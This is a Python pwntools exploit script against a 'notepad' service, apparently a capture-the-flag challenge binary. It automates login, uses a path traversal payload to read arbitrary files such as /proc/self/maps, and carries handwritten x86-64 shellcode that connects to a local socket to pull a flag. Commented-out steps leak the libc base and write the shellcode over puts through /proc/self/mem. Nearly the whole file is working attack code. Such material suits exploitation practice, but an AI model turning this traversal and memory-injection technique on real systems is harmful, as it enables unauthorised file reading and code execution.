from pwn import *
from tqdm import *

context.arch = 'amd64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

cmd_dic = {1:'Login', 2:'Register', 3:'New Note', 4:'Edit Note', 5:'Show Note'}
def dealing_cmd(r, cmd, note_name=b'test', content_len=b'5', content=b'test\n', offset=b'0', random='0'):
    r.recvlines(7)
    if cmd == 1 or cmd == 2:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Username: ', b'sbk' + random.encode())
        r.sendlineafter(b'Password: ', b'sbk' + random.encode())
        # if b'Success' in r.recvline():
        #     log.success(f'Command {cmd_dic[cmd]} Successful')
        # else:
        #     log.error('Command Login Failed!!!')
        print(r.recvline())
    if cmd == 3:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Content Length: ', content_len)
        r.sendlineafter(b'Content: ', content)
        if b'created' in r.recvline():
            log.success(f'Command {cmd_dic[cmd]} Successful')
        else:
            log.error(f'Command {cmd_dic[cmd]} Failed!!!')
    
    if cmd == 4:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', str(offset).encode())
        r.sendlineafter(b'Content Length: ', str(len(content)).encode())
        r.sendlineafter(b'Content: ', content)
        log.success('Done')
    
    if cmd == 5:
        r.sendline(str(cmd).encode())
        r.sendlineafter(b'Note Name: ', note_name)
        r.sendlineafter(b'Offset: ', offset)
        res = r.recv(128).decode().strip()
        return res

def read_any_file(file_name):
    payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
    offset = 0
    res = ''
    while(True):
        ret = dealing_cmd(r, 5, payload, offset=str(offset).encode())
        # print(ret, len(ret))
        if ret != 'Read note failed.' and ret != "Couldn't open the file.":
            res += ret
            offset += 128
        else:
            log.success(res)
            break
    return res

def ugly_shellcode():
    # int fd = socket(AF_INET, SOCK_STREAM, 0);
    socket = """
        xor rax, rax
        mov al, 0x29

        xor rdi, rdi
        mov dil, 0x2

        xor rsi, rsi
        mov sil, 0x1

        xor rdx, rdx

        syscall
        mov r8, rax
    """

    # info.sin_family = AF_INET;
    # info.sin_addr.s_addr = inet_addr("127.0.0.1");
    # info.sin_port = htons(8765);
    # connect(fd, (struct sockaddr *)&info, sizeof(info));
    connect = """
        xor rax, rax
        mov al, 0x2a

        mov rdi, r8

        mov rsi, 0xffffffffffffffff
        mov r9, 0xfeffff80c2ddfffd
        sub rsi, r9
        push rsi
        mov rsi, rsp

        xor rdx, rdx
        mov dl, 0x10

        syscall
    """

    # struct Command cmd;
    # cmd.cmd = 0x8787; // #define CMD_Flag 0x8787
    # write(fd, &cmd, sizeof(cmd));
    write = """
        xor r9, r9
        mov r9w, 0x8787
        push r9

        xor rax, rax
        mov al, 0x1

        mov rdi, r8

        mov rsi, rsp

        xor rdx, rdx
        mov dl, 0xa4

        syscall
    """

    # read(fd, $rsp, sizeof(res));
    read = """
        xor rax, rax

        mov rdi, r8

        mov rsi, rsp

        xor rdx, rdx
        mov dx, 0x104

        syscall
    """

    # write(1, $rsp, 0x40);
    write2console = """
        xor rax, rax
        mov al, 0x1

        xor rdi, rdi
        mov dil, 0x1

        mov rsi, rsp

        xor rdx, rdx
        mov dl, 0x40

        syscall
    """
        
    return socket + connect + write + read + write2console

# Register & Login
# init_port = sys.argv[1]
# r = remote('10.113.184.121', init_port)
r = process('./notepad')
random = os.urandom(1).hex()
dealing_cmd(r, 2, random=random)
raw_input()
dealing_cmd(r, 1, random=random)
dealing_cmd(r, 1, random=random)
dealing_cmd(r, 1, random=random)
dealing_cmd(r, 1, random=random)
dealing_cmd(r, 1, random=random)
dealing_cmd(r, 1, random=random)

# # Read /proc/self/maps to leak Libc Base
# maps_layout = read_any_file(b'/proc/self/maps').split('\n')
# libc_base = int(maps_layout[7][:12], 16)
# puts_addr = libc_base + libc.symbols['puts']
# log.success(f"Libc Base address: {hex(libc_base)}")
# log.success(f'Puts Address: {hex(puts_addr)}')

# # Get Shellcode
# shellcode = asm(ugly_shellcode())
# log.info(f'Shellcode = {shellcode}')

# # write 2 /proc/self/mem
# file_name = b'/proc/self/mem'
# path = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
# dealing_cmd(r, 4, note_name=path, content=shellcode, offset=puts_addr)

r.interactive()